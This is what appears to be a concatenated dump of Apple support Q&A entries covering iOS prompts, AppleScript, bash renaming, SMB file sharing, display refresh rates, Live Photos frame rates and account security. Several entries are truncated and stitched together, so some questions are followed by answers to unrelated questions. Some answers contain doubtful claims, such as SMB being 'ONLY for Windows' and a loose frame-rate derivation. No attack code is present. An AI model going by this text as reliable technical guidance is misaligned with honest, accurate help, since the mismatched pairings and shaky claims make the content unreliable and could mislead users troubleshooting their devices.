I am getting unexpected prompts for my Apple ID on my iPhone SE at random times, including on the lock screen. Here are a couple of examples:\nOn the lock screen\n\nIn the EMail app\n\nThese started appearing a couple of weeks ago.  The prompt dialogs have no identifying information to tell me who's asking, so I'm not about to enter my Apple password until I know who's asking and why.\nI have correlated these to having one specific app either running or configured for background refresh.  If the app is closed and background refresh is disabled, I do not seem to get the prompts.  \nThe app is Appigo ToDo, which has a cloud-based component that does require sign-in.  However, \n\n\n*\n\n*I am already signed in correctly to ToDo Cloud, and if I just dismiss the prompt (Cancel) without entering anything I get no error, and ToDo Cloud proceeds with no issues;\n\n*If I enter my password for ToDo Cloud, the error message is \n\n\n\nSo, something, possibly related to Appigo ToDo Cloud, is asking for my APPLE password.  \nQuestion(s): Given a password prompt dialog, is there any way to determine the source of the request, and the reason for the request?  What else could be causing iOS to be prompting for my Apple password at random times?\n\nA: Perhaps this snippet from this help page at Appigo will provide a clue:\n\niCloud is different from the other synchronization services supported by Todo in that Todo does not actively control when synchronization takes place. When you make changes to your tasks Todo flags its data as having changed; iCloud watches for this flag and synchronizes as needed. In short, while Todo can inform iCloud that it needs to be synchronized, it cannot start or control an active synchronization.\n\nI think that ToDo needs you to manually login to iCloud, which uses your Apple ID for authentication, to sync because the saved password is incorrect. Perhaps you need to reconfirm the login credentials within the ToDo app so it syncs correctly.\n", "Q: Applescript that efficiently listens for changes to the clipboard? I'd like to do something whenever clipboard content changes.  I have a solution working now where I get the clipboard value and store it, then I start an infinite loop where I look up the clipboard again, see if it's changed, then sleep for 0.5s and do it all over again.\nThis definitely works, but I want to do this better! Would prefer if I can listen for a notification that just tells me when the clipboard changes. There's a UIPasteboardChanged event in UIKit that lets you do this, but would prefer not needing to write this in Swift code to accomplish my goal. :-)\nAny ideas on how to do this in Applescript/Automator/Python?  Thanks!\n\nA: I ended up solving this by using Objective C bindings for Python. So not really an AppleScript answer.  It's still polling based, but it's about 1000x more CPU efficient than calling out to pbpaste from the shell.\nAfter installing the AppKit python bindings, I can fetch the current pasteboard like this:\nfrom AppKit import NSPasteboard, NSStringPboardType\nNSPasteboard.generalPasteboard().stringForType_(NSStringPboardType)\n\nI run this in a tight loop, polling every second, and its CPU usage is quite negligible.\n", "Q: After RESTART every new Safari window no longer reflects its DEFAULT appearance.

Occasionally a user will drop a file in a folder for another user to access, but the the files will be greyed out and are inaccessible to the other user, while a different user can see and access it as normal. Sometimes dropping a file will cause a user to just have spinning ball and will not drop.\nIt has worked well enough for a few months now, but this problems has been becoming more frequent.\nEveryone, which is about 20 users all with iMac or Mac pros, connects to the file sharing Mac Pro using the same registered username and password. I have everyone connected via SMB. The file sharing Mac Pro has a Drobo via USB that hosts all the files. All the permissions are set to write and read for everyone.\nAny idea on how to fix this? Do I have this setup correctly?\n\nA: \nEveryone, which is about 20 users all with iMac or Mac pros, connects\n  to the file sharing Mac Pro using the same registered username and\n  password...All the permissions are set to write and read for\n  everyone.\n\nEmphasis Mine\nThis one paragraph sums up the issue you are having; you do not have this setup correctly at all.  What this sounds like is that even though everyone has read/right priviliges, the file gets locked so that only one SMB client can access it at a time.  When two clients access it - even with the same credentials, which client has the correct changes?  SMB solves this for you - the one that got there first.\nWhat you should have is a unique user account for each person that needs to access the file share/server.  If you want to maintain a single login for your users across all servers, look at implementing a directory server of some sort.  I prefer Active Directory as I work in mixed environments; second in line is LDAP.  \n\nA: What Apple has to say about file sharing:\n\"With macOS file sharing, you can allow up to ten users to connect to your Mac at once using File Sharing. If you need to allow more than ten computers to connect to your Mac at once, use macOS Server, which is available in the App Store.\" THIS is the root of your problem, not file access locking/permissions (as Allen alluded to). \nThis has NOTHING to do with file locking (trust me, I've been doing Mac networking since 1983) and EVERYTHING to do with simultaneous connections to the same folder. Take a look at the greyed out file and see if it has a REALLY odd date (1980, Jan 1, 1984, etc.) If so, then the file was never closed properly (usually updating the name of the file, it's permissions, etc.) and the file table hasn't been updated. This is Apple's fault for not following the SMB protocol properly.\nPersonally, I don't see why you are on SMB sharing if everybody in your organization is on a Mac, as SMB is ONLY for Windows machines and it REALLY cludges up your network. SMB stands for \"Server Message Block,\" a Microsoft invention for Windows machines to talk to each other. Apple uses AFS (\"Apple File Sharing\"), which is based on TCP/IP (what the Internet uses). When you use SMB on a Mac, you are engaging a system called SAMBA, which uses SMB/NetBIOS and allows your Mac to speak SMB. SAMBA has it's problems, as does Apple's implementation of SMB. In a \"Mac ONLY\" office, I avoid SMB like the plague, do to the kind of problems you are just beginning to experience.\n", "Q: Applescript date conversion I used to have a AppleScript snippet which convert my date to this format : 08/25/2017 (MM/DD/YY)\nThe source date format changed and I don't managed to make it work \ne.g :\nset creationDate to \"2013-04-03\"\n\n\n\nset [M, ordinal, Y] to the words of creationDate\n\nset the text item delimiters to {\"st\", \"nd\", \"rd\", \"th\"}\nset cardinal to (first text item of ordinal) --> \"2\"\nset cardinal to text -1 thru -2 of (\"0\" & cardinal) --> \"02\"\n\nset the text item delimiters to space\nset date_string to {M, cardinal, Y} as text\n\n-- date -j -f '%B %d %Y' 'June 02 2012' +'%d/%m/%Y'\nset command to {¬\n    \"date -j -f '%B %d %Y'\", ¬\n    quoted form of the date_string, ¬\n    \"+'%d/%m/%Y'\"}\n\nThe creation date is an example but it's taken from a webpage and it's not fix.\nhere the result I received \n\n{\"date -j -f '%B %d %Y'\", \"'2013 04 03'\", \"+'%d/%m/%Y'\"}\n\n\nA: If your example is in the order year, day, month and you want MM/DD/YYYY then this code does the job\nset creationDate to \"2013-04-03\"\nset [Y, ordinal, M] to the words of creationDate\nset the text item delimiters to \"/\"\nset date_string to {M, ordinal, Y} as text\n\nWhat you are attempting to do with the date command is unclear.\n", "Q: Adding random suffixes to filenames I would like to change the filename of a lot of files by adding a random suffix to the existing filenames.  \nI have tried to change this code (changes the filename instead of adding a suffix) but with no succes.\n#!/bin/bash\n\nchars=( {a..z} {A..Z} {0..9} )\n\nfunction rand_string {\n    local c=$1 ret=\n    while((c--)); do\n        ret+=${chars[$((RANDOM%${#chars[@]}))]}\n    done\n    printf '%s\\n' \"$ret\"\n}\n\nfor file in ~/Desktop/test/*; do\n    ext=$(echo ${file} | sed 's,^.*(\\.[^\\.]*$),\\1,')\n    mv \"$file\" ~/Desktop/test/\"$file$(rand_string 10)\"${ext}\ndone\n\nA command line or automator solution would be preferable \n\nA: If you just want to append a randomized string the for loop is rather simple:\ncd ~/Desktop/test/\nfor file in *; do\n    suffix=\"${file##.*}\"\n    base=\"${file%.*}\"\n    mv \"$file\" \"$base.$(rand_string 10).$suffix\"\ndone\n\nChange the 10 to the number of random characters you want to add.\n", "Q: Anyone knows what this third party input method? And is it safe to use it since it's from an unidentified developer? \nIt basically gives you a PinYin-like words prediction but for English\n\nA: When macOS informs you that software etc is from an unidentified developer this doesn't necessarily mean it's unsafe. An unidentified developer simply means that the software has not been registered with Apple. There are many reasons why this may be the case (e.g. the software may date back to before Apple started registering developer IDs).\nRegardless of the quality of the software, if it's not registered than recent versions of macOS will present you with a warning dialog when you try to launch it. Typically this message will identify the app and tell you it's from an unidentified developer, and it may ask you if you're sure you want to open it.\nUnfortunately there is no way for anyone here to advise you if the software you're referring to is safe unless we know what the software is or who the developer is.\n", "Q: What is this field at the bottom of the app closing screen on my iPhone?

If you need more storage on the phone itself you need to buy a bigger model.\n\nA: Your phone still has only 16GB of storage. You probably purchased a 200GB iCloud Storage Plan.

Would using a docking station keep it cooler and make it appreciably faster? I'm thinking of one of the vertical Henge ones. \n\nA: \nWould using a docking station keep it cooler and make it appreciably\n  faster?\n\nNo, a docking station has no \"compute\" power built into it so it can't offload any processing of any kind from the CPU or GPU.  This means it won't be cooler nor faster since the CPU and GPU are still handling the workload.\nThe reason you are seeing a \"slowdown\" when your 4K monitor is connected is because you are driving an external high resolution display with a integrated graphics chipset - the Intel HD Graphics 4000.  Being that it's integrated, it allocates up to 1.5GB of system RAM and uses CPU cycles for GPU processing.\nYour MacBook Pro is slower because you are pushing it to (and past) it's limits in terms of capabilities.\n", "Q: In the workout app, What is the difference between an outdoor walk & and an outdoor run Device: Apple Watch (Series 3)\nOS: Watch OS 4.3\nWhat is measured differently between the two workouts?

As we all know in iOS 11 there are three states for Bluetooth and Wi-Fi buttons in Control Centre: Off, Not Connected, and On.\n\n\n\n*\n\n*I'd like to know whether Not Connected state drains my iPhone battery or not?\n\n*And how to turn off Bluetooth and Wi-Fi completely via Control Centre?\n\nA: Short answer: Yes it does!\n\n\n*\n\n*It would be wrong to say that Not Connected status does not drain the battery at all. However, the drain rate is significantly less as the device is not connected to any access point (for Wi-Fi) and Bluetooth radio doesn't consume much battery anyways.\n\n*In iOS 11, it is not possible to completely turn off Wi-Fi and Bluetooth from the Control Centre. It could only be done from within the Settings app.\nQuoting from the Apple Support document, Use Bluetooth and Wi-Fi in Control Center with iOS 11\n\nAbout Wi-Fi and Bluetooth\nIn iOS 11 and later, when you toggle the Wi-Fi or Bluetooth buttons in Control Center, your device will immediately disconnect from Wi-Fi and Bluetooth accessories. Both Wi-Fi and Bluetooth will continue to be available, so you can use these important features:\n  \n  \n*\n  \n*AirDrop\n  \n*AirPlay\n  \n*Apple Pencil\n  \n*Apple Watch\n  \n*Continuity features, like Handoff and Instant Hotspot\n  \n*Instant Hotspot\n  \n*Location Services\n  \n\nThus, it is apparent that battery draining will still happen. However, the device disconnects from Wi-Fi access point and Bluetooth accessory.\n", "Q: App in background I have an iPhone 5C, running an app that is connected to a Bluetooth device. When the connection to the Bluetooth device is lost (spreading apart, Bluetooth turned off etc.) the app sounds a buzzer. From what I´ve read, specific apps are allowed to run in the background, and some of them communicate with Bluetooth devices. For this particular app, that is true almost all the time.\nThe problem happens when I browse in the Web. Sometimes the app gets killed and the buzzer sounds. I am sure it gets killed because when I tap on the app in the multi-tasking UI, it reopens. When I tap on the app while running, it shows the Bluetooth device connected. Is there a way to prevent the app from getting killed?\nThe App is Itrack Easy and the device is a Bluetooth button. I am testing this App because I intend to use this device as a panic button connected to the phone with my own App. My problem is not that hear the buzzer or not. My problem is that if this test App gets killed, mine will too and the button will not work as a panic device, available when the phone is near.\n\nA: No, you can't force iOS to keep an app active in the background.  In fact, Apple specifically instructs iOS developers to assume their app will be removed from memory soon after the user puts it into the background.\nThe app developer would need to code the app in such a way that it handles disconnections from the bluetooth device in a graceful way (assuming the buzzing you hear when the app goes into the background is not an intended function).  The developer can also add code to allow the app to periodically 'wake up' and check for the bluetooth connection.  However, there's nothing you can do from your side on that.\nI recommend you contact the app developer and see if they've already addressed this in a new app version (your iPhone 5C can't run iOS 11 or newer).  If not, do they intend to fix it or do they offer a work-around.\n", "Q: How to create a new identity in macOS?

If not, then this answer may not apply.\nAfter holding down the option key until the icons appear, you can permanently select default operating system to boot from by holding down the control key before selecting label below the desired icon.\nNext, you have not completely deleted Windows 10.

I wonder if it's worth learning VoiceOver as a help tool to repair Macs and iOS devices with no-video issues.  Any experiences regarding this?\n\nA: Probably, but VoiceOver is a complicated beast. I really wouldn't wish learning it on anyone if they didn't have to. It's probably just easier to hook up an external display over HDMI/thunderbolt/USBc or mirror the display to and appleTv. But if you feel it necessary, go for it. Apple has a good help guide on it. It is a bit out of date, but the basics really haven't changed. Applevis.com also has a robust introduction to MacOS and VoiceOver.\n\nA: I'll answer myself this question after I've done a bit of research for the Macs (not for iOS devices yet):\nThere're a few Voiceover commands that can help speed up the troubleshooting when the mac has no video.\nHowever, none of these is as useful as connecting an external display.\nTo start with, you need to learn these easy basic voiceover commands (keyboard shortcuts):\n\n\n*\n\n*Command + F5: turn on or off Voiceover.\n\n*Command + ALT: this is the default  shortcut to use voiceover commands, just hold these keys (keep them pressed) while also pressing any of the other keys explained here.

I have a Late 2013 15\" Macbook Pro with discrete graphics. \nAccording to this Apple support page: https://support.apple.com/en-us/HT206587 this model supports 4K 60Hz over MST.\nI just purchased a Dell P2415Q monitor, which supports DisplayPort 1.2, MST, and 4K 60Hz.\nI have the two connected by the included mini DisplayPort to DisplayPort cable.\nAnd the monitor is running at 30Hz.\nEverything I've read suggests that I should be able to get the monitor to run at 60Hz, but I can't find out how to. I'm trying to find answers among all the search results, but they're either outdated, different models, or asking about HDMI.\nCan anyone assist me?\nEDIT: Here's the monitor's display options, which show that I've turned on MST and where I'm getting that it's running at 30Hz:\n\n\nA: Okay so I got 60hz working at 4K. Despite the fact that I swear I already tried this, the key was turning off MST.\nUnfortunately, I can't recall why I turned MST on in the first place. Did I create my own problem? I will say that I was unfamiliar with what Multi-Stream Transport was when I read the Apple support doc that I linked to in my question, and the doc was written in such a way to suggest that it was necessary for me to have on to get 60Hz on my MacBook Pro model.\n\nA: I have a 15\" mid-2015 MacBook Pro and had the same problem: my P2415Q monitor was running at 30Hz instead of 60Hz, despite being connected over DisplayPort. I'm not sure exactly what caused this problem in the first place: I had previously been using the monitor at 60Hz. But it seems to have gotten stuck at 30Hz after I unplugged from a different monitor. Initially, MST was set to Off.\nI solve the problem by going under Menu -> Display and setting MST to Primary, then to Secondary, then to Off. Initially, MST was set to Off, so it is strange that this fixed the problem, but it did!\nNow my monitor is running at 60Hz!\nEdit: Sometimes this fix doesn't work. Another potential solution is to simply unplug the monitor's power, then plug it back in. Another solution is to use the \"advanced display preferences\" to manually set the refresh rate to 60Hz: https://www.macobserver.com/tips/quick-tip/macos-finding-hidden-advanced-display-preferences/\nUsing all these solutions, I can consistently get my monitor to work properly.\n", "Q: What are the FPS of the FaceTime Camera for the iPhone 6S vs 7+ vs X vs iPad Pro? We are capturing video from iOS devices and processing it using OpenGL but are encountering a FPS difference between the devices when trying to set them at their maximum rate. \nThe iPhone 6S and iPad Pro FaceTime cameras are maxing at 60 fps.\nThe 7+ and iPhone X however are maxing at 30 fps. \nIt seems unusual that the FPS would decrease with later versions of Apple's hardware. We are trying to figure out if this is a software issue or simply the technical specifications for the frame rate for the FaceTime camera. \nWe looked on Apple's technical specifications page but the frame rates of the FaceTime cameras aren't listed (though the rear cameras are.) For example:\nhttps://www.apple.com/iphone-6s/specs/\nhttps://www.apple.com/iphone-x/specs/\nWhat are the FPS of the FaceTime Camera for the iPhone 6S vs 7+ vs X vs iPad Pro?\n\nA: Here is the beginning of an answer.\nWe found a private library method of Apple's (not allowed in the app store) called CAMCaptureCapabilities which has a read only property called front1080pMaxFPS. \nWe were able to run this on an iPhone X and found the front camera maximum to be 30fps. \nOn the iPhone 6S/6S+ we have an app that is able to set the camera to 60fps. \nWe still need to test on other phone models to see their maximum (i.e. particular iPhone 7 and 8.)\nInterestingly, this means the iPhone X's front camera is slower than an iPhone 6S/6S+.\n\nA: The camera used for FaceTime on an iPhone is the front camera, often referred to as the secondary camera. The main camera is often referred to as the primary camera.\nIn terms of the secondary camera of the various iPhone models you're asking about, the frames per second ratings are the same for all of them: 1080p@30fps or 720p@240fps.\nWhere these cameras differ are in their other specs (e.g. the iPhone 6s has a 5MP camera, while the iPhone 7 has a 7MP camera.\n", "Q: How can I type ` character when using Chinese input source?

The enter key does not act as a submit key How do you send a photo from my photo files? \nThe enter key does not act as a submit key\n\nA: There are a number of ways you can send a photo from the Photos app on your iPad.\nTo send photos, you can:\n\n\n*\n\n*Launch the Photos app\n\n*Tap on the photo you want to send (or, in the case of multiple photos, tap on the Select option and select the photos you want to send)\n\n*Tap on the share icon (see image below)\n\n\n\n\n\n*Now select how you want to send it (e.g. via Message, Mail, etc)\n\n\nYou can also send photos directly from within apps. By way of example, you can compose a new email message and tapping on the screen will give you the option to Insert Photo or Video. Doing this will open the Photos app from where you can select the photos/videos you want to attach to your email. Likewise, within the Messages app you can tap on the camera icon to be presented with a choice of taking new photos or accessing existing photos in your Photos library.\n", "Q: I can't convert from HFS+ to APFS an external SSD volume I created for testing I created an external volume with macOS High Sierra.  When I try to convert it to APFS with Disk Utility, the \"convert to APFS\" is greyed out.  I tried unmounting the volume first, then it's not greyed out, but when I try to convert, I get this error: The operation couldn’t be completed. (com.apple.DiskManagement error -69546.).\nI heard that having \"cloned\" a volume may prevent it from being converted to APFS.  I don't remember if I cloned it or not.  I created it with El Capitan, then upgraded it to High Sierra.  Now it won't convert to APFS.\nAny way to do the conversion? such as terminal command or something?\n\nA: According to this and this article the post-install conversion to APFS should work in Recovery Mode:\n\n  \n*\n  \n*Boot the Mac into Recovery Mode by holding down the Command and R keys until you see the macOS Utilities screen.\n  \n*Open Disk utility.\n  \n*Choose your boot volume [the external boot drive].1\n  \n*Click on the Edit menu\n  \n*Click on Convert to APFS\n  \n*When prompted with “Would you like to convert  to APFS?”   \n  \n*click on the Convert button.\n  When the process is finished, click on the Done button.\n  \n\n1: According to Redarm's comment you have to unmount the volume additionally!\n\nI can't test this myself - your mileage may vary.\n\nA: To add to klanomath's answer, which does convert the system volume to APFS, but leaves it in an un-bootable state: \ndownload the High Sierra install assistant (aka full installer) and either create a bootable installation volume, or use it from a different High Sierra volume, if available.\nThen run the installer over the newly converted APFS volume.\nThis is non-destructive and will leave all user files in place, but it will create the missing \"Preboot\", \"Recovery\" and \"VM\" volumes within the APFS container, which makes the volume bootable and cleans up any left-over Recovery HD from the previous (HFS+ formatted) installation.\n", "Q: Messages using email instead of phone number Messages shows the email of the person I am sending to instead of their phone number on some contacts. Why is it picking the email up for some contacts and the number for others\n\nA: A single contact entry in your iPhone may have one or more email address, phone number or both listed.\nPeople using iPhone are logged in with their Apple ID which requires an email address to create. The phone number of the iPhone gets linked to the Apple ID. However, Apple ID can be used to login into Mac or an iPad as well. It's also possible that a person is using a Mac or iPad and not having an iPhone, in which case the phone number doesn't get linked with Apple ID.\nMessages app on iPhone gives priority to iMessage over SMS (if the recipient's email/phone number is registered with Messages). The Messages app displays the email address of the recipient if it's an Apple ID. The message can be sent as an iMessage.\nIn your case, its possible that the contact has only email address available and it's an Apple ID registered with Messages. If the contact also has a phone number saved, it will be listed and SMS can be sent to it.\n", "Q: Odd Frame Rate 29.68 fps in Live Photos Why 29.68 fps? \nIs it possible to set up a 30 fps or 29.97 fps frame rate for Live Photos? \nThe problem is a video part of Live Photos in iPhone X in iOS 11.3 uses quite strange variable frame rate – 29.68 fps, that is not suitable for editing presets in FCP or DaVinci Resolve. If I convert Live Photos' frame rate to 30 fps or even 25 fps, a sound slightly or noticeably drifts away from sync at some point.\nP.S. Live Photos in iPhone 7 (iOS 10) work with 29.97 fps. \n \n\nA: I'll try to answer my own question. I'm not sure this is 100% right.\nI suppose frame rate's issue depends on the architecture of Live Photos itself. Total number of frames inside each Live Photo in iPhoneX is 85 frames (look at the picture above):\n42frames + 1frame + 42frames = 85frames\n\nFrame rate for all these 85 frames is supposedly 30 fps, but considering just a video part (without a HEIC file), frame rate is 29.68 fps. \nHere's a math:\n//let's assume that 1/85th is 0.011764, \n//truncate that floating point number to 0.011\n1 / 85 = 0.011\n\n//let's assume that video frame rate of all 85 frames is 30 fps \n//so each frame's contribution is approximately 0.33 fps\n30 fps * 0.011 = 0.33 fps\n\n//thus H.265 video portion without HEIC frame will be 29.67 fps\n30 fps - 0.33 fps = 29.67 fps\n\nValue 29.67 fps is very close to 29.68 fps. \n\nI reckon that altogether all 85 frames of Live Photos have frame rate 30 fps, but two H.265 video portions (without HEIC part) have frame rate 29.68 fps.\n\n", "Q: How to access katakana on the Japanese keyboard for the iPhone?

Your best solution would be to both wrap the name in \" characters and use the shell's built in completion to get the right name. \nType cd \"/Volumes/TOSH then type a tab and the shell will complete the name with any spaces and non-standard characters included. If the tab completes the entire path then the shell will even insert a \"/ at the end so you are ready to then hit return.\nNote that standard bash completion will work on file paths and names for most shell commands, not just cd.\n\nA: Guided by this response I found that GVM2 \"Golang Version Manager\" added CD function in my PATH, which somehow took precedence over the BASH CD.\n", "Q: Allow m3u files to be edited in TextEdit, saved, and used without a \"is damaged and can't be opened\" message I am using OS X El Capitan.\nI edit the .m3u files that are playlists with TextEdit. After editing and trying to play the playlist files I receive the \"is damaged and can't be opened\" message.\nI can get around this by adjusting the whole system security (system preferences -> security and privacy) to allow apps downloaded from anywhere but I'd like to somehow set .m3u files to be editable without security concerns instead of changing the whole system to be less secure.\nHow can I get the .m3u extension to be ignored by this type of security.\n\nA: .m3u files are really nothing more than just basic plain text files. My guess is that you're getting this issue because TextEdit is not currently set to use plain text as its format.\nYou don't specify what version of macOS you're running, but in the more recent versions of TextEdit you can change how it deals with file formats by default.\nChange the default TextEdit format\nYou can change the default TextEdit format as follows:\n\n\n*\n\n*Launch TextEdit\n\n*Go to TextEdit > Preferences... (or just use the command, shortcut)\n\n*Ensure you have the New Document tab\n\n*At the top you'll see three options for Format. Select the Plain text option.\n\n*Exit preferences\n\n\nNow when you edit an existing .m3u file (i.e. it already has the .m3u extension) then it should be fine.\nIf you create a new file, be it a .m3u file or one in another format, you will need to manually add the extension to the filename when you save it. If not, it will default to the Plain Text extension (i.e. .txt) instead. You can also change this behaviour in Preferences by going into the Open and Save tab and unticking the checkbox for Add \".txt\" extension to plain text files. \n", "Q: Is there a way to disable Safari CSP (Content Security Policy) check?

It's also definitely not something that can be fixed by resetting NVRAM, the SMC or performing First Aid on your disk(s).\nWhat you are seeing is a dialog box that pops up; usually when you are hovering over a link.  I extracted the frame from your YouTube video clip to see what was being shown and it appears to be the link below the one you have selected.\n\nAs you have already said, the problem only manifests in Safari.  Your best course of action would be to provide feedback to Apple so that they can address the issue/bug.  Provide them with a link to this question/answer so they get the full picture (no pun intended). \nBottom line:  It's nothing more than a box with a document title/link in it and it only appears for less than a split second.

I didn't find any place in the Dock settings...\nI don't want to see any apps on the right of the separator.\n\n\nA: Drag the folders away from the Dock and wait until the cursor changes to indicate they will be removed, and let go. You have to do this one at a time for folder stacks as Monomeeth says. \nTo prevent minimized windows from showing to the right of the separator, go to System Preferences > Dock and check the “minimize windows into application icon” setting.\n\nA: The separator at bottom right of the dock (or at the bottom if your Dock is on the side) is not there to show your last opened programs. Instead, to the right of the separator are what's called stacks, any minimsed app windows and the Trash. \nBasically, stacks are really just folders located in the Dock. By default, users will usually have a Downloads stack.\nBased on the image you've included in your question, it looks like the items to the right of your separator are actually minimised app windows. These windows appear there when you choose to 'minimise' them, as opposed to closing them. In other words, the 12 icons you have between your Downloads stack and your Trash can are actually windows you still have open in their various apps, but they've been minimised instead of closed.\nWhen you choose to minimise a window by clicking on the amber button at top left, it minimises into the dock at the righthand side of the separator (at left of the Trash can). The purpose of this is to give you quick access to it again without having to relaunch the app or reload the website, etc.\nIf you want to actually close the window, click on the red button at top left instead. If you want to quit the app altogether, you need to use the command Q shortcut (or select Quit from the application's name menu).\nSee image below for clarify:\n\nSince this separator is part of macOS and its purpose is to separate stacks, minimised windows and the Trash, there is no way to remove it.\nYour only option would be to investigate using 3rd party software to see if any of them will meet your needs. Below are some examples for you to investigate further:\n\n\n*\n\n*uBar\n\n*ActiveDock\n\n*HyperDock\nNOTE: I am not affiliated in any way with any of the above products.\n", "Q: Install older OSX a dual boot on a computer with OSX High sierra I need to install a secondary OSX, older one, like yosemite or something, on a computer, which has High sierra installed.

Any ideas?\nI'm also trying to download the OSX High sierra installer and the damn App Store is saying \"downloading\", but that's it, no clue how far it is or if it is actually downloading...\n\nA: \nNote: The OP has reported that this procedure initially failed to work on a 2015 MacBook Pro. However, if you read the comments, the OP eventually successed. The procedure does work on my 2013 iMac.\n\nI am not sure I understand exactly how VirtualBox works, but I have always assumed the hardware was virtual. Therefore, if a particular operating system would run on one machine, then it should run on any machine where VirtualBox is installed. I suppose there are certain obvious limitations due to machine hardware, such as:\n\n\n*\n\n*The amount of physical memory.\n\n*The physical number of cores.\n\n*The speed of the USB ports.\n\n*Whether the processor is 32 bit or 64 bit.\n\n*The amount of drive space available.\n\n*The speed of processor, memory and logic (mother) board).\n\n\nThe reason I bring up this issue is that I have a 2013 iMac that can run Yosemite, but I would prefer to run High Sierra. Unfortunately, I also have software (such as Adobe CS5) that does not work well with High Sierra. I have found it to be relatively trivial to install Yosemite as a guest in VirtualBox. The instructions are based on website OS X on OS X. These instructions also state that newer Macs have to fake the processor in order to run Yosemite. Since I do not have a newer Mac, I can not test to see if this is true. So, you will have to try the instructions for yourself.\n\nBefore anyone complains, according to the SOFTWARE LICENSE AGREEMENT FOR OS X YOSEMITE this is legal to do.\n\nTo be complete, I have repeated the instructions below.

A friend of mine has an iPhone 8. Each time she changes her email or password on things like Facebook, Email, Instagram, her Bank app etc., we suspect her ex-boyfriend is changing them back within 30 seconds. He lives 5 states away.\nMy friend has used my phone and my email to change her password and email on Facebook, but her passwords are changed again when she tries to log in.\nCan someone jailbreak her phone and install an app where her ex would be able to see everything she does?\n\nA: Based on what you mentioned about her using your phone, it is very doubtful that the ex of your friend has access to her iPhone, via a jailbreak or other means. If anything, the ex likely has access to the email account that is linked to all these other services.\nI would check her email settings to make sure the ex is not linked as a recovery account. If there is nobody linked as a recovery account, start by changing the email password. If the ex has access to the email account, they can use security notification emails from various accounts to change those passwords again.\nMake sure to use strong, unique passwords for each service. Never reuse old passwords. A password manager would be helpful here.\nThen, it would be highly recommended to enable 2-step authentication. Google has some info about that here, but this will be different for other email services. This prevents people from logging into your account, even if they know the password.\nI would then change passwords and enable 2-step authentication on other accounts.\n", "Q: Ethernet via Thunderbolt display with MacBook Pro 2017 (A1707)? I've connected my new MacBook Pro to my Apple Thunderbolt display using the Apple Thunderbolt 3 (USB-C) to Thunderbolt 2 Adapter. The display and USB are working as expected but I'm not getting any ethernet. Ethernet is working fine with my old Thunderbolt 2 MacBook Pro. Has anyone been able to get this working?\n\nA: It looks like this other post provided the hint that I needed to get this working! MacBook Sierra display ethernet needs constant re-starting\nUnplugging the display and then plugging it back in fixed the problem! What a pain!\n\nA: According to this the trick is:\n\nTo get the ethernet on the display working, I had to disconnect the\n  USB-C adapter, delete (AFAIR) the Thunderbolt Bridge from the network\n  preferences, and then reconnect the adapter.\n\nThis worked for me too, I now have Display Ethernet in the network interfaces list.\n", "Q: Will I lose all existing photos if I turn on photo-syncing to iTunes for the first time? iPhone4, syncing to iTunes 10.6.3 on a mac G5 running OS 10.5.8\n(This is the latest system version that the G5 will run)\nI sync some audio on the G5 to my wife's iPhone, no problem.\nAbout half the iPhone memory is taken up with photos going back several years- photos have never been synced. If I turn ON photo syncing now, will it delete all photos on the phone? We do NOT want this to happen! But it's clogged up, and the photos don't need to be on the phone, just kept somewhere else where we can see them. But how do we get them to that \"safe somewhere else\" without risking them getting deleted forever?

I have a iPad 4th gen. I want to delete unused apps.  Is there a way to easily tell what apps are not being used?\n\nA: In iOS 11, you can set up your ipad to move unused apps. Go to Settings and then tap General. In General there is a page for iPhone Storage. Here there is an option to remove unused apps. If you enable this then unused apps will be removed.\nSomeone reported on this site that they had a problem with there iPad not accurately determining the last used date. That person was getting this \"app never used\" setting for all apps. I assume you want to avoid that.\nIf you scroll down on same page where you enable the removal of unused apps, there is a list of all apps on your device. Under the name of each app is the last used date. Make sure that that field does not have \"Never Used\" for apps you know you have used.\n\nA: This is the perfect use case for the Offload Unused Apps feature introduced in iOS 11.\nThis feature is designed to automatically remove apps you're not using. It's a low risk approach because even though the apps are removed, any documents and data are still kept in case you want to re-install the apps later (assuming they're still available/compatible).\nUnfortunately, your iPad is not compatible with iOS 11.\nFor users with compatible devices, to enable this feature (assuming your on iOS 11), go to Settings > iPad Storage and then tap on Enable to activate the Offload Unused Apps option. \nNOTE: - While in the Settings > General > iPad Storage screen your list of Apps will populate to indicate how much storage space they’re taking and also when they were last used (or if never used).\n", "Q: Browsers open all links in a new tab Suddenly all the browsers begin to open all links in a new tab.

I downloaded MacOS High Sierra 10.13.4 and have the \"Install MacOS High Sierra\" application. My problem is that when I try to install MacOS High Sierra, the only available disk to select is \"Restore Image,\" which \"Install MacOS High Sierra\" tells me is used for Time Machine backups, but it is gray and faded and I can't select it. I have FileVault turned off and \"Restore Image\" selected in my \"Startup Disk\" menu. How can I be able to select the disk and install MacOS High Sierra 10.13.4?\n\nA: I think the installer is not allowing you to install because you need to FIRST update the firmware.  You do this by making a USB installer from the installer app and booting to it.\nhttps://support.apple.com/en-us/HT201372\nYou will need to choose HFS+ as the format and the High Sierra Installer will convert the disk to APFS (if the target drive is an SSD).\n", "Q: How to allow the \"Word of the Day\" screen saver to fetch the words with LittleSnitch? A friend of mine (not on StackEchange) has used LittleSnitch to explicitly disallow Internet access for every process/app that attempted to access the Internet except the ones he actually needs to do this (e.g. Safari, Skype etc.) (to save traffic and maintain better privacy). Everything he wants works great but one thing doesn't - the \"Word of the Day\" screensaver, it won't show the words, obviously because it can't fetch them from the dictionary server. Looking through the rules list (the blocked executables/apps names) doesn't suggest any obvious candidate to allow. What is the name of the process that is responsible for fetching the words for the screen saver and needs to be allowed?\n\nA: I believe you should be allowing connections from the ScreenSaverEngine.app, which is located at \n/System/Library/CoreServices/ScreenSaverEngine.app\n\n", "Q: How do I run my automator service without opening automator? I created an automator service that duplicates a specified folder to the desktop, but I'm unsure how to run this service whenever I need it without having to open automator.\nI was thinking it would be available on right-click of a finder window or the desktop for example, or even via keyboard shortcut?\n\n\nA: In summary, to create a keyboard shortcut to run your Automator service you will need to use:\n\n\n*\n\n*Automator to create your service so that it'll work the way you want\n\n*System Preferences to assign a keyboard shortcut to the service\n\n\nBelow are the steps involved for each. \n1. Create a service using Automator\nYou're on the right track with your Service, however you need to change where the Service receives no input from. Below are the instructions (from scratch so that it's useful to others):\n\n\n*\n\n*Launch Automator (usually found within your Applications folder)\n\n*Go to File > New\n\n*Select Service and click Choose\n\n*In the top right hand of the window that appears, ensure that \"No input\" is selected from the Service receives drop-down list\n\n*Ensure the In drop-down list is showing \"Any application\" (Note: This is where you went wrong as you had selected Finder)\n\n*In the second column containing the long list, find \"Get Specified Finder Items\" and double-click on it\n\n*This will add the Get Specified Finder Items window on the right\n\n*Now click on the Add... button to select the design kit folder you're 